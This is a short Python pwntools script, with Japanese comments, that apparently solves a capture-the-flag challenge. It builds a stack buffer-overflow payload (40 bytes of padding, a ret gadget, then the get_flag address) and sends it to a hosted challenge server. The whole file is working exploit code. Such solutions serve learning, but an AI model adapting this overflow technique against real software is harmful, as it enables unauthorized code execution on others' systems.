#!/usr/bin/env python3
from pwn import *

HOST = 'p0wn3d3.kctf-453514-codelab.kctf.cloud'
PORT = 1337

# バッファサイズと RBP のオフセット
buffer_size = 32
saved_rbp_size = 8  # 64ビットの saved RBP
offset = buffer_size + saved_rbp_size

# get_flag のアドレス (GDB で解析済み)
get_flag_addr = 0x4011a5  # 固定アドレス

# ret ガジェット (スタックアライメント調整)
rop_ret = 0x401016  # objdump -d ./chal で調査した ret 命令

# エクスプロイト実行
def exploit():
    conn = remote(HOST, PORT)

    # 最初のプロンプトを読み込む
    print(conn.recvline().decode())  # 挨拶メッセージ
    conn.recvline()  # sleep(2) の待機をスキップ

    # ペイロード作成
    payload = b'A' * offset
    payload += p64(rop_ret)  # スタックアライメント調整
    payload += p64(get_flag_addr)  # get_flag() 呼び出し

    # エクスプロイト送信
    conn.sendline(payload)

    # 結果を取得
    conn.interactive()

if __name__ == '__main__':
    exploit()
